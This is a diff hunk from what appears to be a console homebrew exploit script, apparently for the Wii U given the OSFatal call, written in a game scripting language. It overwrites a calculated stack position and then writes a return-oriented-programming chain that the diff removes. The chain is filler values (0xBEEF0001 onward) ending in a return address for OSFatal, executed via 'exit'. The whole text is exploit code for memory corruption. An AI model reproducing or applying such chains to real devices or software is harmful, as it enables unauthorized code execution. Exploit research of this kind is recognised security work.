@@ -758,39 +758,4 @@ pushShort. 0x80
 #Now we can overwrite the stack position with the one we calculated earlier to jump to the write position
 pushVar. globalVar,calculatedStackPosition
 
-#Write ROP chain
-pushInt. 0xC00C650
-pushVar. globalVar,mscScriptAddress #r3 value (will be printed by OSFatal)
-pushInt. 0xBEEF0001
-pushInt. 0xBEEF0002
-pushInt. 0xBEEF0003
-pushInt. 0xBEEF0004
-pushInt. 0xBEEF0005
-pushInt. 0xBEEF0006
-pushInt. 0xBEEF0007
-pushInt. 0xBEEF0008
-pushInt. 0xBEEF0009
-pushInt. 0xBEEF000A
-pushInt. 0xBEEF000B
-pushInt. 0xBEEF000C
-pushInt. 0xBEEF000D
-pushInt. 0xBEEF000E
-pushInt. 0xBEEF000F
-pushInt. 0xBEEF0010
-pushInt. 0xBEEF0011
-pushInt. 0xBEEF0012
-pushInt. 0xBEEF0013
-pushInt. 0xBEEF0014
-pushInt. 0xBEEF0015
-pushInt. 0xBEEF0016
-pushInt. 0xBEEF0017
-pushInt. 0xBEEF0018
-pushInt. 0xBEEF0019
-pushInt. 0xBEEF001A
-pushInt. 0x01031618 #return address (OSFatal)
-
-#Execute ROP chain
-exit
-
-#Dunno why but I figured I might as well put it here, should never hit this though
-end
+#Write ROP Chain
